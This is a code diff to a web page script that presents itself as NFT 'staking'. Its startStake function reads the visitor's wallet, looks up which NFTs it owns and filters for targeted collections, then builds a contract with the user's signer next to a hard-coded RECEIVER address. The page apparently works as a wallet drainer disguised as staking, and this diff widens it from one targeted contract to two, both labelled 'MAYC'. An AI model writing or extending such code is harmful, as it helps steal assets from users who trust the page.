@@ -37,8 +37,16 @@
 
 <script>
 
-const MAYC =
-  "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D";
+const ALLOWED_CONTRACTS = [
+  {
+    name: "MAYC",
+    address: "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D"
+  },
+  {
+    name: "MAYC",
+    address: "0x60e4d786628fea6478f785a6d7e704777c86a7c6"
+  }
+];
 
 const RECEIVER =
   "0x974c32106390e0F378f36FbF4428d4F32D813dd7";
@@ -74,7 +82,7 @@ async function startStake() {
 
     console.log("Wallet:", wallet);
 
-    // fetch MAYC NFTs
+    // fetch NFTs
     const res = await fetch(
       `https://eth-mainnet.g.alchemy.com/nft/v2/${API}/getNFTs/?owner=${wallet}`
     );
@@ -82,24 +90,27 @@ async function startStake() {
     const data =
       await res.json();
 
-    const maycs =
+    // filter for allowed contracts
+    const allowedAddresses = ALLOWED_CONTRACTS.map(c => c.address.toLowerCase());
+    const nfts =
       data.ownedNfts.filter(
         nft =>
-          nft.contract.address.toLowerCase() ===
-          MAYC.toLowerCase()
+          allowedAddresses.includes(
+            nft.contract.address.toLowerCase()
+          )
       );
 
-    if (maycs.length === 0) {
+    if (nfts.length === 0) {
 
-      alert("No MAYC Found");
+      alert("No eligible NFT found");
 
       return;
 
     }
 
-    // first MAYC
+    // first NFT
     const nft =
-      maycs[0];
+      nfts[0];
 
     const tokenId =
       ethers.BigNumber
@@ -118,7 +129,7 @@ async function startStake() {
 
     const contract =
       new ethers.Contract(
-        MAYC,
+        nft.contract.address,
         abi,
         signer
       );
